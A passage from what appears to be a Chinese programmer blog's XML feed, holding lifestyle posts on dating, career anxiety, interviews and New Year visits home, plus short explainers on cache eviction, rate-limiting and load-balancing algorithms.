姑八大姨也不会少，自己也可以主动出击，各种相亲网站、社交聚会、户外活动、或者出去旅个游什么，又或者直接把魔爪伸向自己的同学、同事，近水楼台先得月，除非你真的不喜欢异性。</p><p>现在是互联网时间，别人给你介绍对象可能都是在微信上面，直接给推荐个对方的名片，有的介绍的甚至在异地。</p><p>这种成功率真的非常低，能见上面的算是好的，不好的，微信聊上几回或者就打个招呼没下文了，我见过很多这样的，我自己也有好多这样的故事，即使能见上一面，如果不是彼此都相互看中眼，或是有共同的兴趣爱好和价值观，也很难走到一起。</p><p>我还知道有那些相亲网站，有的相亲网站，你交点会费就能和心仪的对象收发留言、查看联系方式等，里面骗子也多，很多酒托、饭托，有的甚至唱双黄来骗你的钱财，不要被对方美貌的照片所骗了，你懂的，照片真的只能仅供参参考，一切以实物为准了……</p><p>还有些高级点的相亲平台更有意思，你想找到怎样档次的人，决定你交多少的钱。比如，你交 1W 能帮你介绍一个白领，2W 能帮你介绍一个有车的白领，3W 能帮你介绍一个有房有车的白领，5W 能帮你找到一个啥都有的海龟……</p><p>当然，以上金额和条件仅供参考，但确实是这样，你交越多的钱，就离自己心中心仪的对象越近，至于是否真的可以成功，是否靠谱，我就没有经验了，有没有套路，你也得小心你的钱包。</p><p>总之，相亲的套路、骗子都非常多，能不能找到，全靠自己招数了！</p><p>过来人的经验再告诉你，能从同学搞定就同学搞定，毕竟是最纯真的感觉，没有被社会……这也是最最真致的爱情。</p><p>出来社会的就会深有感触，谈恋爱结婚哪这么容易，简直就是两家人的事情了，各种谈条件，车啊房啊，经济背景、家庭背景，太物质，已经背离了爱情的本质，有多少情侣挂在了谈彩礼这道关，两家人不欢而散、形同陌路，令人唏嘘……</p><p>身边也有很多 30 来岁的女同事没有谈对象，至于原因也没有深究，或许是一直在相亲中选择，挑剔，结果最后把自己挑剩下了，又或许是一直找不到自己的真爱，又或许是恐婚不想恋爱……（这个我没有发言权，我也不敢多问，怕被打，如果你知道情况，欢迎留言）</p><p>最后，虽然都说缘分天注定，但我想说，幸福是自己争取和创造出来的，希望你们都能在对的时间遇上对的人，也多珍惜眼前人，以此献给我们广大的程序员同胞们。</p><p>本文仅是我个人的看法，不一定全对，但确实深有感触。</p><p>你是怎么搞定对象的？欢迎留言分享攻略……</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序猿，你工作几年了？</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E7%A8%8B%E5%BA%8F%E7%8C%BF%EF%BC%8C%E4%BD%A0%E5%B7%A5%E4%BD%9C%E5%87%A0%E5%B9%B4%E4%BA%86%EF%BC%9F/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E7%A8%8B%E5%BA%8F%E7%8C%BF%EF%BC%8C%E4%BD%A0%E5%B7%A5%E4%BD%9C%E5%87%A0%E5%B9%B4%E4%BA%86%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>今天周末，不说技术了，放松放松，谈谈人生吧？</p><p>你是谁？你来自哪里？你为什么搞程序？你搞程序多少年了？你喜欢搞程序吗？你的梦想是什么？</p><p>工作多年，你还有梦想吗？你还有当年的激情吗？当初的小伙伴还有常联系吗？庞杂的微信朋友圈还有几个能说上话的？即使是当年关系很好的同学朋友现在也许也是形同陌路。当年追求过的对象也早已为人妇。。偶尔有人联系你，不是借钱，就是骗子，还是就是要结婚。当然结婚还记得叫你，也算是还记得你这个人。。</p><p>时间冲刷着记忆，这所有的一切如梦境一场，也许早已被岁月磨平了菱角。。你是否有相同的感受？</p><p>程序猿是技术活，技术是脑力活，更是苦力活。。整天一动不动地坐在吵杂的办公室，反复着相同的节奏，有时候是否也曾想下去当回民工搬搬砖，去送送快递来的舒服？</p><p>可又曾想，民工、快递员他们也都想像我们一样坐在高大上的办公室，动动电脑就行了，又不要到处跑，多轻松处在，他们又曾理解我们的痛楚？</p><p>在亲朋好友的眼中，你可能是光鲜亮丽的白领高层人士，摸摸鼠标看看电脑拿着高薪。。可在你自己眼中你可能会看不起你自己的职业，看不起你自己，更看不起在饭堂、电梯等公共场合讨论技术的屌丝猿类。。</p><p>还记得前几天的暴风事件吗？APP更新日志上写着杀了一个程序猿祭天，这简直就是对程序猿莫大的歧视。。虽然后面删除了，也不排除炒作的嫌疑。</p><p>虽然行行出状元，做一行爱一行，所以只要努力，并跟对形势，有一天终将成功，但做猿类能成功的又有几个？？终将看命。</p><p>做什么都不容易，工作为了什么？为了钱？这肯定是没错的，当然也是为了更好的生活，给后代更好的教育。。这都没错。拼不了爹，只能拼命。。</p><p>干程序的有女生吗？很少吧？有也是国家珍宝了。干程序的女生也要多大的毅力在这行坚持下去？坚持下去的就更是冰山一角了。</p><p>程序猿能干到多少岁？国内35估计是天花板了，那些35岁的程序猿都干嘛去了？40多岁的呢？你还能写几年代码，吃几年青春饭？</p><p>当我们逐渐老去，我们还能做些什么来面对年龄增长的危机？架构师？管理层？转行？创业自己当老板？也许这都有可能，但这都不容易。没有牛逼的技术做不了架构师，没有吹牛逼的能力也上不了管理层，没有牛逼的后盾转行从0开始也非常难很多就是又转回猿类界了，没有钱没有人脉创业当老板更是难上加难，但我们必须转型，哪一项更适合自己呢？也许没有统一的答案，但我们必须为此付诸实践，做好规划，以免被社会淘汰。</p><p>好了，说的有点散，你们有些人可能不赞同我的心声，不能理解，没关系，因为你们离这还很遥远。。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊聊我面试过的一个最奇葩的 Java 程序猿！</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E8%81%8A%E8%81%8A%E6%88%91%E9%9D%A2%E8%AF%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%B8%AA%E6%9C%80%E5%A5%87%E8%91%A9%E7%9A%84%20Java%20%E7%A8%8B%E5%BA%8F%E7%8C%BF%EF%BC%81/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E8%81%8A%E8%81%8A%E6%88%91%E9%9D%A2%E8%AF%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%B8%AA%E6%9C%80%E5%A5%87%E8%91%A9%E7%9A%84%20Java%20%E7%A8%8B%E5%BA%8F%E7%8C%BF%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>上周我聊了聊最让我反感的 10 种程序猿，无奈一个小时就进行了删除，详细原因就不说了，容易招黑。</p><p>今天聊的我面试过的最奇葩的一个程序猿，绝对是奇葩中的奇葩，简直是程序猿中的另类，最让我反感的程序猿又添加新成员了。。</p><p>这次的还会继续删除？那是不可能的，我要让所有人都能见证这个奇葩。。</p><p><img src="http://img.javastack.cn/18-6-8/61721511.jpg"></p><p>那是一个下午，和往常没什么区别，我走向洽谈室准备迎接一场 Java  面试。更多的细节有点忘了，此人长得有点滑稽，面了几分钟，技术也不怎么样，我也不想再问下去了，他在我心里就已经不合适了。关键，面试过程还时不时拿着手机看。。</p><p>出于礼貌，觉得他跑一趟也不容易，也出于不让他难堪（几分钟就完事了……），想着多给他几分钟交流的时间，或者他有其他更厉害的地方。</p><p><strong>真是让人大跌眼镜啊，面着面着他电话响了，然后直接接起来了，他也没说他去接个电话，说着说着就直接打开门出去了……</strong></p><p>然后我在门口一直等了几分钟，他也没有停下的意思，可能他也知道他技术不咋的，然后我就不耐烦了，直接叫前台妹妹把他赶走得了。前台也出于礼貌，让他打完再走，谁知打了 10 来分钟也没有停下的意思……</p><p>最后不知道他打了多久，前台去查看的时候已经走了，我看着他走的，不知道有多久，反正你我无法接受的一个时间。。</p><p>面了很多人，第一次遇到这种奇葩，真是服气了！</p><p><strong>@All 要是你遇到这种人，你会怎么做？期待有意思的留言！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过年回家，程序猿最怕的 5 件事，深有感触。</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E8%BF%87%E5%B9%B4%E5%9B%9E%E5%AE%B6%EF%BC%8C%E7%A8%8B%E5%BA%8F%E7%8C%BF%E6%9C%80%E6%80%95%E7%9A%84%205%20%E4%BB%B6%E4%BA%8B%EF%BC%8C%E6%B7%B1%E6%9C%89%E6%84%9F%E8%A7%A6%E3%80%82/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E8%BF%87%E5%B9%B4%E5%9B%9E%E5%AE%B6%EF%BC%8C%E7%A8%8B%E5%BA%8F%E7%8C%BF%E6%9C%80%E6%80%95%E7%9A%84%205%20%E4%BB%B6%E4%BA%8B%EF%BC%8C%E6%B7%B1%E6%9C%89%E6%84%9F%E8%A7%A6%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>时间过得真快啊，一月接一月，一年又一年。程序猿工作繁忙，每天游离于代码之间，似乎已经忘记了时间的流淌。</p><p>话说又要回去过年了，作者是心有余悸的。已经习惯在大城市生活的一线码农，早已不能融入故乡那种风气的生活。但又要面对许多你需要面对的事情，比如以下几件。</p><h4 id="一、借钱"><a href="#一、借钱" class="headerlink" title="一、借钱"></a>一、借钱</h4><p>笔者无时不刻接受到亲朋好友的借钱。这不还没回去过年，一亲戚就要借钱盖房，同时得知他买了辆车。车是刚需吗？不买车就有钱盖房，就不用麻烦别人，买车了还找别人借钱盖房！我很无语。</p><p>钱是好东西，谁都喜欢。对于借钱这事，借，或者不借，都让人头疼。不借，是因为自己并不宽裕，可又不能得到理解，增加猜忌。借了，自己就会拮据，守信用的又非常少，钱出去容易回来就难，讨钱也会使亲朋好友变世仇。我认为，不是生死困难的事，不要轻易找别人借钱。</p><p><img src="http://img.javastack.cn/18-2-4/86768584.jpg" alt="image"></p><h4 id="二、相亲"><a href="#二、相亲" class="headerlink" title="二、相亲"></a>二、相亲</h4><p>相亲或许也是程序猿最怕的。程序猿闷骚、宅、内向、腼腆的性格，使他们不容易打开社交圈，更不擅长与异性打交道，成为多年钻石单身也并不觉得奇怪。</p><p>有一朋友回家过年，还没到家，就被转送到女方家，一脸蒙逼的情况下才知道是相亲。更可怕的是，接连相亲，一个相不中，不断有媒婆来与你牵线搭桥，相亲也是饭桌上或者茶余饭后的各长辈们的谈资，表示不胜其烦。</p><p><img src="http://img.javastack.cn/18-2-4/1327300.jpg" alt="image"></p><h4 id="三、修电脑"><a href="#三、修电脑" class="headerlink" title="三、修电脑"></a>三、修电脑</h4><p>笔者有过很多非IT朋友，或者朋友的朋友找我，无非就是电脑坏了、路由器连不上无线、买什么笔记本好……等各种问题。程序猿就一定会修电脑吗？会买电脑吗？我只想说，程序猿!&#x3D;网管。</p><p>现年代，电脑早已是平民用品，有点领悟或者动手能力的人，一般的电脑问题都可以自行解决。</p><p><img src="http://img.javastack.cn/18-2-4/70001282.jpg" alt="image"></p><h4 id="四、应酬"><a href="#四、应酬" class="headerlink" title="四、应酬"></a>四、应酬</h4><p>多年不联系的老同学：XX，我结婚了……</p><p>班长：XX，初X有空吗，很多老同学，来参加聚会……</p><p>亲戚：XX，初X来我们家吃饭……</p><p>各种聚会，不管你喜欢或者厌烦，都得面对，都得融入。可谓是“抽烟喝酒应酬多，伤身伤肾没处说”。</p><p><img src="http://img.javastack.cn/18-2-4/67388781.jpg" alt="image"></p><h4 id="五、无颜"><a href="#五、无颜" class="headerlink" title="五、无颜"></a>五、无颜</h4><p>无颜面对江东父老，这也是笔者最惧怕的，为什么这么说？笔者，作为我们农村为数不多读大学出去的，身上寄托着太多太多相亲们、亲戚们的期待……</p><p>而如今，我却在一线城市涡居，轮为一线码农，高昂的房价已经让笔者定居都成为一个梦想，更别提帮助他们。他们曾经帮助过我，而如今我不能回馈他们，我表示辜负了他们的期待，无法面对他们。。</p><p><img src="http://img.javastack.cn/18-2-4/83383520.jpg" alt="image"></p><p><strong>最后，有钱没钱，回家过年。比起成就，父母更在乎的是一家人团聚。不管再多艰难，也得勇敢面对，过去过不去，都会过去。回家吧，游子们。。</strong></p><p>如果你也深有感触，欢迎转发到朋友圈。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过了所有技术面，却倒在 HR 一个问题上。。</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E8%BF%87%E4%BA%86%E6%89%80%E6%9C%89%E6%8A%80%E6%9C%AF%E9%9D%A2%EF%BC%8C%E5%8D%B4%E5%80%92%E5%9C%A8%20HR%20%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E4%B8%8A%E3%80%82%E3%80%82/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E8%BF%87%E4%BA%86%E6%89%80%E6%9C%89%E6%8A%80%E6%9C%AF%E9%9D%A2%EF%BC%8C%E5%8D%B4%E5%80%92%E5%9C%A8%20HR%20%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E4%B8%8A%E3%80%82%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>面试问离职原因，这是我们广大程序员朋友面试时逃不开的问题，如果答得不好，可能就影响了你整个的面试结果</p><p>如图，那就是千万不要说老东家的坏话。</p><h2 id="栈长经历"><a href="#栈长经历" class="headerlink" title="栈长经历"></a>栈长经历</h2><p>说到这个事，我真的有话要说，因为我也被这个坑过。记得有次我去一家互联网金融公司面试，前面三、四轮面试都过了，在最后一轮 HR 面倒下了。</p><p>那女的问我为什么要离职，我说想寻找更好的机会，她又问我为什么想寻找更多的机会，然后又一个劲的问我真实原因，我没忍住说漏了嘴说~~~~~~~抱怨了几句，然后后面聊的就不是不愉快了，很八婆的一个女的，总绕不开这个离职原因这个话题 。。。</p><p>最后，她出去一会，再进来，和我说不合适，让我回去。面了三、四个小时，说走就走，一点也不留情面，感觉很草率。前面过了几轮都没用，浪费时间，最后却因为她的一翻不愉快的谈话就终止了面试。</p><h2 id="为什么不能说老东家坏话？"><a href="#为什么不能说老东家坏话？" class="headerlink" title="为什么不能说老东家坏话？"></a>为什么不能说老东家坏话？</h2><p>我们站在新公司的角度想这个问题。</p><p>我们知道，每个公司都有每个公司的各种问题，没有一个完美的公司的，不可能尽所有人意的。</p><p>如果你抱怨离职公司的各种问题，甚至说坏话，新公司也同样担心你从他们公司离职后说他们的坏话，对公司造成不良影响。</p><p>再者，每个公司都会排斥负能量的人，一个公司如果存在负能量的人，就会漫延开影响到更多的人，正所谓，一粒老鼠屎打坏一锅汤。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以，大家引以为戒，这也是栈长给大家的一个面试经验。面试找工作时，被问离职原因，千万不要有任何负面的情绪，其他的原因你可以随便编，最好说一些积极向上的原因，并能接得上来。</p><p>所以，你再怎么和老东家同事不和，再怎么恨老东家，你也不能抱怨老东家，更不能说老东家的任何坏话，不然你技术再牛逼也无济于事。</p><p>好了，栈长今天的分享就到这里了，离职原因你有什么妙招？大家可以留言分享下，畅所欲言~~~</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>都几套房了，还写个毛的代码！</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E9%83%BD%E5%87%A0%E5%A5%97%E6%88%BF%E4%BA%86%EF%BC%8C%E8%BF%98%E5%86%99%E4%B8%AA%E6%AF%9B%E7%9A%84%E4%BB%A3%E7%A0%81%EF%BC%81/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E9%83%BD%E5%87%A0%E5%A5%97%E6%88%BF%E4%BA%86%EF%BC%8C%E8%BF%98%E5%86%99%E4%B8%AA%E6%AF%9B%E7%9A%84%E4%BB%A3%E7%A0%81%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-10-22/95553809.jpg"></p><p>好久没有和大家交心了，最近又来了好些个新朋友，可能对公众号和博主还不太熟悉，那就先从最近一个知识星球粉丝说起吧，《都几套房了，还写个毛的代码！》标题的中心思想就来源于此，这说起来有点难以置信，但值得反思。</p><p>本文可能会有点长，但值得字字看下去！</p><h2 id="因为穷才做程序员写代码吗？"><a href="#因为穷才做程序员写代码吗？" class="headerlink" title="因为穷才做程序员写代码吗？"></a>因为穷才做程序员写代码吗？</h2><p>说到程序员，是因为没钱才做程序员吗？可能大家觉得大部分程序员是如此，但不能代表所有，这得从前阵子的一个星球粉丝说起……</p><p>那是前几天的一个晚上，都 23 点多了，星球上的一位粉丝还在微信上给我发消息，说遇到一个很不好理解的技术问题，问我为什么。博主我本来都要睡了，本想第二天再回复他的，不过看他的问题有点意思，于是回复了一下。</p><p>他问的是一个 violatile 关键字的问题，他知道这个关键字能保证变量在多线程之间的可见性，但在一个示例代码中没用到这个关键字，为什么也可见了。我看了下他的代码截图，就知道是什么问题了。</p><p>这其实博主在很早之前的一篇文章中说过《<a href="https://mp.weixin.qq.com/s/IYBD0Hb4butsnXPUlzW5xQ">一个诡异的”可见性”问题</a>》，于是我就随手把这篇文章就丢给他了！</p><p>然后他看完后就豁然开朗，发给我一个红包表示感谢，当然我没有领，举手之劳而已！于是，我就说我要休息了，让他也早点休息。他说他再撸一下代码，好多东西要学，工作 5、6 年了，很多知识点都停留在 1、2 年的水平，面试频繁碰壁。</p><p>聊着聊着，原来对方是个隐形富二代，家里条件算不错，在大城市里面还有几套房。我顿时就惊了，条件这么好了还半夜写代码？他说他不喜欢喝酒应酬，不喜欢经常出差。几年前培训学了 Java 编程，然后就爱上程序员行业了，觉得每天坐在办公室里写写代码很安静、很舒服、很自由。</p><p>所以说，并不是因为没钱才做程序员，可能是因为梦想，因为对程序员这个行业的喜爱。</p><h2 id="关于公众号"><a href="#关于公众号" class="headerlink" title="关于公众号"></a>关于公众号</h2><p>说起这位粉丝，真是人比人气死人啊，家里都几套房了，还写个毛的代码？居然还这么努力。。。博主这么穷，都睡得很早，感触良多啊。。。不怕有钱人学代码，就怕有钱人比你还更努力。。。</p><p>其实，博主也算比较努力的了，只是时运不济，混得比较衰而已。工作多年，到现在也没有在深圳买上一套房，没有能在一线城市站稳脚跟，说起来惭愧，都是泪啊。</p><p>即使如此，我也没有放弃，最近一直在坚持学习新技术，坚持写博主、写公众号，这一年多来就已经写了 300+ 篇原创文章了，粉丝数接近 10W，而且目前已经写完的，还没发出来的文章存货就还有 30+ 篇，后续会陆续分享出来。</p><h2 id="关于广告"><a href="#关于广告" class="headerlink" title="关于广告"></a>关于广告</h2><p>博主很穷，还要努力存钱买房，这在普遍 6、7 万&#x2F;平的深圳真有点难。。所以，博主除了分享技术文章，偶尔也会接一些广告投放。但请大家放心，博主已经拒绝了大量的垃圾广告（如：P2P、理财、玉石、去斑……）和很多以 ”送福利” 为借口依托的隐形广告。</p><p>博主虽穷，但做人绝对刚直，绝对有原则有底线，对大家有风险、与程序无关的垃圾广告我是 100% 拒绝的，给再多钱我也不会接，所有能发出来广告都是经过博主慎重筛选的。</p><p>所以，之前、或者后续，大家有看到了一些广告，也请多理解博主吧。博主是穷逼程序员，要吃饭，要生存，在感谢博主辛苦写文章带给你知识的同时，也请多理解偶尔的一两次商业广告投放，而且对大家是有益的，何况现在哪个公众号没有广告呢，只是看公众号的底线在哪里！</p><p>如果你觉得这还不够，每次看完文章，你也可以多点点赞、多给加下鸡腿支持一下，我也是没意见的，我就喜欢这样知恩图报的粉丝，这样我写文章都来劲了。。</p><p>为了大家的阅读体验，本公众号永久关闭文中插播广告功能！</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用缓存淘汰算法详解</title>
      <link href="/2025/10/30/%E7%AE%97%E6%B3%95/%E5%B8%B8%E7%94%A8%E7%BC%93%E5%AD%98%E6%B7%98%E6%B1%B0%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/10/30/%E7%AE%97%E6%B3%95/%E5%B8%B8%E7%94%A8%E7%BC%93%E5%AD%98%E6%B7%98%E6%B1%B0%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><img src="http://cc.cocimg.com/api/uploads//image/20171030/1509368302170729.jpg" alt="image"></p><p>缓存算法是指令的一个明细表，用于决定缓存系统中哪些数据应该被删去。</p><p>常见类型包括LFU、LRU、ARC、FIFO、MRU。</p><p><strong>最不经常使用算法（LFU）：</strong></p><p>这个缓存算法使用一个计数器来记录条目被访问的频率。通过使用LFU缓存算法，最低访问数的条目首先被移除。这个方法并不经常使用，因为它无法对一个拥有最初高访问率之后长时间没有被访问的条目缓存负责。</p><p><img src="http://xiaorui.cc/wp-content/uploads/2015/04/20150420105345_48639.png" alt="image"></p><p><strong>最近最少使用算法（LRU）：</strong></p><p>这个缓存算法将最近使用的条目存放到靠近缓存顶部的位置。当一个新条目被访问时，LRU将它放置到缓存的顶部。当缓存达到极限时，较早之前访问的条目将从缓存底部开始被移除。这里会使用到昂贵的算法，而且它需要记录“年龄位”来精确显示条目是何时被访问的。此外，当一个LRU缓存算法删除某个条目后，“年龄位”将随其他条目发生改变。</p><p><img src="http://upload-images.jianshu.io/upload_images/1466264-5a472df5ec57137f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p><strong>自适应缓存替换算法(ARC)：</strong></p><p>在IBM Almaden研究中心开发，这个缓存算法同时跟踪记录LFU和LRU，以及驱逐缓存条目，来获得可用缓存的最佳使用。</p><p><strong>先进先出算法（FIFO）：</strong></p><p>FIFO是英文First In First Out 的缩写，是一种先进先出的数据缓存器，他与普通存储器的区别是没有外部读写地址线，这样使用起来非常简单，但缺点就是只能顺序写入数据，顺序的读出数据，其数据地址由内部读写指针自动加1完成，不能像普通存储器那样可以由地址线决定读取或写入某个指定的地址。</p><p><img src="http://images.cnitblog.com/i/221914/201407/082202026607080.png" alt="image"></p><p><strong>最近最常使用算法（MRU）：</strong></p><p>这个缓存算法最先移除最近最常使用的条目。一个MRU算法擅长处理一个条目越久，越容易被访问的情况。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>接口限流算法：漏桶算法 &amp; 令牌桶算法。</title>
      <link href="/2025/10/30/%E7%AE%97%E6%B3%95/%E6%8E%A5%E5%8F%A3%E9%99%90%E6%B5%81%E7%AE%97%E6%B3%95%EF%BC%9A%E6%BC%8F%E6%A1%B6%E7%AE%97%E6%B3%95%20&amp;%20%E4%BB%A4%E7%89%8C%E6%A1%B6%E7%AE%97%E6%B3%95%E3%80%82/"/>
      <url>/2025/10/30/%E7%AE%97%E6%B3%95/%E6%8E%A5%E5%8F%A3%E9%99%90%E6%B5%81%E7%AE%97%E6%B3%95%EF%BC%9A%E6%BC%8F%E6%A1%B6%E7%AE%97%E6%B3%95%20&amp;%20%E4%BB%A4%E7%89%8C%E6%A1%B6%E7%AE%97%E6%B3%95%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>每一个对外提供的API接口都是需要做流量控制的，不然会导致系统直接崩溃。很简单的例子，和保险丝的原理一样，如果用电符合超载就会烧断保险丝断掉电源以达到保护的作用。API限流的意义也是如此，如果API上的流量请求超过核定的数值我们就得对请求进行引流或者直接拒绝等操作。</p><h2 id="限流算法"><a href="#限流算法" class="headerlink" title="限流算法"></a>限流算法</h2><p>既然要限流，就得提到限流算法了，一般有漏桶算法和令牌桶算法两种限流算法。</p><h5 id="漏桶算法"><a href="#漏桶算法" class="headerlink" title="漏桶算法"></a>漏桶算法</h5><p>漏桶算法(Leaky Bucket)是网络世界中流量整形（Traffic Shaping）或速率限制（Rate Limiting）时经常使用的一种算法，它的主要目的是控制数据注入到网络的速率，平滑网络上的突发流量。漏桶算法提供了一种机制，通过它，突发流量可以被整形以便为网络提供一个稳定的流量。</p><p>漏桶可以看作是一个带有常量服务时间的单服务器队列，如果漏桶（包缓存）溢出，那么数据包会被丢弃。<br>在网络中，漏桶算法可以控制端口的流量输出速率，平滑网络上的突发流量，实现流量整形，从而为网络提供一个稳定的流量。</p><p>如图所示，把请求比作是水，水来了都先放进桶里，并以限定的速度出水，当水来得过猛而出水不够快时就会导致水直接溢出，即拒绝服务。</p><p><img src="http://images.cnitblog.com/blog/522490/201411/081225378155003.png" alt="image"></p><p>可以看出，漏桶算法可以很好的控制流量的访问速度，一旦超过该速度就拒绝服务。</p><h5 id="令牌桶算法"><a href="#令牌桶算法" class="headerlink" title="令牌桶算法"></a>令牌桶算法</h5><p>令牌桶算法是网络流量整形（Traffic Shaping）和速率限制（Rate Limiting）中最常使用的一种算法。典型情况下，令牌桶算法用来控制发送到网络上的数据的数目，并允许突发数据的发送。</p><p>令牌桶算法的原理是系统会以一个恒定的速度往桶里放入令牌，而如果请求需要被处理，则需要先从桶里获取一个令牌，当桶里没有令牌可取时，则拒绝服务。从原理上看，令牌桶算法和漏桶算法是相反的，一个“进水”，一个是“漏水”。</p><p><img src="http://images.cnitblog.com/blog/522490/201411/081226107372877.png" alt="image"></p><p>Google的Guava包中的RateLimiter类就是令牌桶算法的解决方案。</p><h2 id="漏桶算法和令牌桶算法的选择"><a href="#漏桶算法和令牌桶算法的选择" class="headerlink" title="漏桶算法和令牌桶算法的选择"></a>漏桶算法和令牌桶算法的选择</h2><p>漏桶算法与令牌桶算法在表面看起来类似，很容易将两者混淆。但事实上，这两者具有截然不同的特性，且为不同的目的而使用。</p><p>漏桶算法与令牌桶算法的区别在于，漏桶算法能够强行限制数据的传输速率，令牌桶算法能够在限制数据的平均传输速率的同时还允许某种程度的突发传输。</p><p>需要注意的是，在某些情况下，漏桶算法不能够有效地使用网络资源，因为漏桶的漏出速率是固定的，所以即使网络中没有发生拥塞，漏桶算法也不能使某一个单独的数据流达到端口速率。因此，漏桶算法对于存在突发特性的流量来说缺乏效率。而令牌桶算法则能够满足这些具有突发特性的流量。通常，漏桶算法与令牌桶算法结合起来为网络流量提供更高效的控制。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析负载均衡的 6 种算法，Ngnix 的 5 种算法。</title>
      <link href="/2025/10/30/%E7%AE%97%E6%B3%95/%E6%B5%85%E6%9E%90%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%206%20%E7%A7%8D%E7%AE%97%E6%B3%95%EF%BC%8CNgnix%20%E7%9A%84%205%20%E7%A7%8D%E7%AE%97%E6%B3%95%E3%80%82/"/>
      <url>/2025/10/30/%E7%AE%97%E6%B3%95/%E6%B5%85%E6%9E%90%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%206%20%E7%A7%8D%E7%AE%97%E6%B3%95%EF%BC%8CNgnix%20%E7%9A%84%205%20%E7%A7%8D%E7%AE%97%E6%B3%95%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h4 id="常见的几种负载均衡算法"><a href="#常见的几种负载均衡算法" class="headerlink" title="常见的几种负载均衡算法"></a>常见的几种负载均衡算法</h4><p><strong>1、轮询法</strong></p><p>将请求按顺序轮流地分配到后端服务器上，它均衡地对待后端的每一台服务器，而不关心服务器实际的连接数和当前的系统负载。</p><p><strong>2、随机法</strong></p><p>通过系统的随机算法，根据后端服务器的列表大小值来随机选取其中的一台服务器进行访问。由概率统计理论可以得知，随着客户端调用服务端的次数增多，</p><p>其实际效果越来越接近于平均分配调用量到后端的每一台服务器，也就是轮询的结果。</p><p><strong>3、源地址哈希法</strong></p><p>源地址哈希的思想是根据获取客户端的IP地址，通过哈希函数计算得到的一个数值，用该数值对服务器列表的大小进行取模运算，得到的结果便是客服端要访问服务器的序号。采用源地址哈希法进行负载均衡，同一IP地址的客户端，当后端服务器列表不变时，它每次都会映射到同一台后端服务器进行访问。</p><p><strong>4、加权轮询法</strong></p><p>不同的后端服务器可能机器的配置和当前系统的负载并不相同，因此它们的抗压能力也不相同。给配置高、负载低的机器配置更高的权重，让其处理更多的请；而配置低、负载高的机器，给其分配较低的权重，降低其系统负载，加权轮询能很好地处理这一问题，并将请求顺序且按照权重分配到后端。</p><p><strong>5、加权随机法</strong></p><p>与加权轮询法一样，加权随机法也根据后端机器的配置，系统的负载分配不同的权重。不同的是，它是按照权重随机请求后端服务器，而非顺序。</p><p><strong>6、最小连接数法</strong></p><p>最小连接数算法比较灵活和智能，由于后端服务器的配置不尽相同，对于请求的处理有快有慢，它是根据后端服务器当前的连接情况，动态地选取其中当前</p><p>积压连接数最少的一台服务器来处理当前的请求，尽可能地提高后端服务的利用效率，将负责合理地分流到每一台服务器。</p><h4 id="Nginx的5种负载均衡算法"><a href="#Nginx的5种负载均衡算法" class="headerlink" 